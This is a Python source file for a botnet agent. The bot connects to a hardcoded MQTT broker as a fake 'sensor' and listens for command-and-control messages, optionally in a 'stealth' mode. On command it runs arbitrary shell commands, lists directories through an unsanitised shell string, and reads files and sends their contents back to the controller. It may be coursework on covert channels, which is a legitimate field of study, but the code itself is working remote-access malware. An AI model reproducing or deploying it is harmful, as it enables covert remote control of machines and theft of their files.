"""
Bot - MQTT C&C Agent using layered protocol stack.
"""
import subprocess
import os
import random
import time
import paho.mqtt.client as mqtt
import json
from protocol import ProtocolStack, StealthProtocolStack, deserialize_packet

# --- CONFIGURATION ---
BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
SALT = "S4ur0ns_S3cr3t_S4lt_2025"
SEND_INTERVAL = float(os.environ.get("SEND_INTERVAL", 1.0))
ID_SCAN_TIME = 2.0  # Seconds to scan for existing IDs
USE_STEALTH_MODE = os.environ.get("USE_STEALTH_MODE", "True").lower() == "true"
DEBUG = os.environ.get("DEBUG", "False").lower() == "true"


def scan_existing_ids(broker: str, port: int, topic: str, scan_time: float) -> set:
    """Scan the network for 2 seconds to find existing sensor IDs."""
    existing_ids = set()
    
    def on_message(client, userdata, msg):
        try:
            data = deserialize_packet(msg.payload)
            sensor_id = data.get("sensor_id", "")
            if sensor_id.startswith("sensor_"):
                existing_ids.add(sensor_id)
        except:
            pass
    
    def on_connect(client, userdata, flags, reason_code, properties):
        client.subscribe(topic)
    
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(broker, port, 60)
    client.loop_start()
    
    time.sleep(scan_time)
    
    client.loop_stop()
    client.disconnect()
    
    return existing_ids


def generate_unique_id(existing_ids: set) -> str:
    """Generate a unique bot ID (never ends with 1)."""
    while True:
        # Generate ID that doesn't end with 1 (reserved for hubs)
        base = random.randint(100, 999)
        suffix = random.choice([0, 2, 3, 4, 5, 6, 7, 8, 9])
        bot_id = f"sensor_{base}{suffix}"
        
        if bot_id not in existing_ids:
            return bot_id


# Global stack reference for handle_message
stack = None
BOT_ID = None


def handle_message(message: dict):
    """Handle incoming messages from the protocol stack."""
    global stack, BOT_ID
    
    msg_type = message.get("type")
    target = message.get("target")
    sender = message.get("sender")
    
    # Only handle commands targeted at us
    if msg_type != "command":
        return
    if target != "ALL" and target != "ME":
        return
    
    command = message.get("cmd")
    arg = message.get("arg", "")
    
    print(f"[*] Command received: {command} {arg}")
    output = execute_command(command, arg)
    
    # Send response
    stack.send(sender, "response", output=output)


def execute_command(command: str, arg: str) -> str:
    """Execute a command and return output."""
    try:
        if command == "ping":
            return "Pong"
        elif command == "w":
            return subprocess.getoutput("w")
        elif command == "ls":
            path = arg if arg else "."
            return subprocess.getoutput(f"ls -la {path}")
        elif command == "id":
            return subprocess.getoutput("id")
        elif command == "exec":
            return subprocess.getoutput(arg)
        elif command == "copy":
            if os.path.exists(arg):
                with open(arg, "r", errors='ignore') as f:
                    return f"FILE_START:{arg}:{f.read()}"
            else:
                return "File not found"
        else:
            return "Unknown Cmd"
    except Exception as e:
        return str(e)


if __name__ == "__main__":
    # Scan for existing IDs to avoid collisions
    print(f"[*] Scanning for existing nodes ({ID_SCAN_TIME}s)...")
    existing_ids = scan_existing_ids(BROKER, PORT, TOPIC, ID_SCAN_TIME)
    
    if existing_ids:
        print(f"[*] Found {len(existing_ids)} existing nodes")
    
    # Generate unique ID
    BOT_ID = generate_unique_id(existing_ids)
    
    # Create and start protocol stack
    StackClass = StealthProtocolStack if USE_STEALTH_MODE else ProtocolStack
    stack = StackClass(
        node_id=BOT_ID,
        broker=BROKER,
        port=PORT,
        topic=TOPIC,
        salt=SALT,
        send_interval=SEND_INTERVAL,
        debug=DEBUG
    )
    
    mode_str = "STEALTH" if USE_STEALTH_MODE else "FINGERPRINT"
    
    # Register message handler
    stack.on_receive(handle_message)
    
    print(f"[*] Bot {BOT_ID} [{mode_str}] (sending every {SEND_INTERVAL}s)...")
    stack.start()
    
    try:
        # Keep running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stack.stop()
        print("\n[*] Bot stopped.")